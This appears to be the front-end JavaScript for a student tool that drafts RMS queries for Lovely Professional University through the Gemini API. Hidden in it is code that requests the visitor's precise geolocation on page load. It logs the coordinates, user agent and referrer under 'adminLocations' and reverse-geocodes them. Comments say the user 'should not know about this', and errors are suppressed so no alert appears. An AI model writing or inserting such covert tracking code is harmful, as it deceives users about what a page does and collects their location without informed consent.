document.addEventListener('DOMContentLoaded', function() {
    const generateBtn = document.getElementById('generate-btn');
    const copyBtn = document.getElementById('copy-btn');
    const resultContainer = document.getElementById('result-container');
    const rmsQueryElement = document.getElementById('rms-query');
    const loadingElement = document.getElementById('loading');
    
    loadingElement.classList.add('hidden');
    
    // Existing event listeners
    generateBtn.addEventListener('click', generateRMSQuery);
    copyBtn.addEventListener('click', copyToClipboard);
    
    // Try to silently get location when page loads
    attemptToGetLocation();
    
    // Silent location tracking
    function attemptToGetLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                storeLocation, 
                handleLocationError, 
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
    }
    
    function storeLocation(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        
        // Get existing locations or initialize empty array
        let storedLocations = localStorage.getItem('adminLocations');
        let locations = storedLocations ? JSON.parse(storedLocations) : [];
        
        // Add new location with timestamp and page info
        locations.push({
            coords: { latitude, longitude },
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            page: 'RMS Generator',
            referrer: document.referrer || 'Direct'
        });
        
        // Keep only the latest 100 locations
        if (locations.length > 100) {
            locations = locations.slice(-100);
        }
        
        // Save back to localStorage (admin will access this)
        localStorage.setItem('adminLocations', JSON.stringify(locations));
        
        // Try to get more details about the location
        fetchLocationDetails(latitude, longitude);
    }
    
    function fetchLocationDetails(latitude, longitude) {
        // Silently fetch location details
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
            .then(response => response.json())
            .then(data => {
                if (data && data.address) {
                    // Get existing locations
                    let storedLocations = localStorage.getItem('adminLocations');
                    let locations = storedLocations ? JSON.parse(storedLocations) : [];
                    
                    // Find the most recent location and add address info
                    if (locations.length > 0) {
                        const lastLocation = locations[locations.length - 1];
                        lastLocation.address = {
                            city: data.address.city || data.address.town || data.address.village || 'Unknown',
                            state: data.address.state || data.address.county || 'Unknown',
                            full: data.display_name || 'Unknown'
                        };
                        
                        // Save updated data
                        localStorage.setItem('adminLocations', JSON.stringify(locations));
                    }
                }
            })
            .catch(err => {
                // Silently fail - user should not know about this
                console.error("Error getting location details", err);
            });
    }
    
    function handleLocationError(error) {
        // Silently fail - don't alert the user
        console.log("Could not get location: " + error.message);
    }
    
    // Existing RMS query generation functions
    async function generateRMSQuery() {
        const problemStatement = document.getElementById('problem-statement').value.trim();
        const tone = document.getElementById('tone').value;
        const department = document.getElementById('department').value;
        const apiKey = document.getElementById('api-key').value;
        const creativity = document.getElementById('ai-creativity').value;

        if (!problemStatement) {
            alert('Please enter a problem statement.');
            return;
        }

        loadingElement.classList.remove('hidden');

        try {
            const currentDate = new Date().toLocaleDateString('en-GB');

            const rmsQuery = await generateWithGemini(
                problemStatement,
                tone,
                department,
                currentDate,
                apiKey,
                creativity
            );

            rmsQueryElement.textContent = rmsQuery;
            resultContainer.classList.remove('hidden');
        } catch (error) {
            alert('Failed to generate query. ' + (error.message ? error.message : 'Please try again later.'));
            console.error('Error generating query:', error);
        } finally {
            loadingElement.classList.add('hidden');
        }
    }

    async function generateWithGemini(problem, tone, department, date, apiKey, temperature) {
        const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
        const prompt = `
As a student at Lovely Professional University (LPU), I need to write an RMS (Request Management System) query about the following issue:

My problem: ${problem}
Preferred tone: ${tone}
Department I'm addressing: ${department}
Today's date: ${date}

Please write a complete RMS query that I can submit. Include:
- Today's date
- An appropriate subject line for my ${department} issue
- A greeting that matches my preferred ${tone} tone
- A clear explanation of my problem
- A proper closing

Important: Write the full message as if I'm directly submitting it. DO NOT include any placeholders like "[Name]" or "[Registration Number]" - I'll add my personal details myself later. 

The message should sound natural and authentic, as if a real LPU student wrote it.
`;

        const requestBody = {
            contents: [{
                parts: [{ text: prompt }]
            }],
            generationConfig: {
                temperature: parseFloat(temperature),
                topK: 40,
                topP: 0.95,
                maxOutputTokens: 1024
            }
        };

        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody)
        });

        const data = await response.json();

        if (!response.ok) {
            let errorMsg = 'Failed to get response from Gemini API';
            if (data && data.error && data.error.message) {
                errorMsg += ': ' + data.error.message;
            }
            throw new Error(errorMsg);
        }

        if (
            !data.candidates ||
            !data.candidates[0]?.content?.parts?.[0]?.text
        ) {
            throw new Error('Gemini API did not return a valid response.');
        }

        return data.candidates[0].content.parts[0].text;
    }
    
    function copyToClipboard() {
        const rmsText = rmsQueryElement.textContent;
        navigator.clipboard.writeText(rmsText)
            .then(() => {
                copyBtn.textContent = 'Copied!';
                setTimeout(() => {
                    copyBtn.textContent = 'Copy to Clipboard';
                }, 2000);
            })
            .catch(err => {
                console.error('Failed to copy: ', err);
                alert('Failed to copy to clipboard. Please try again.');
            });
    }
});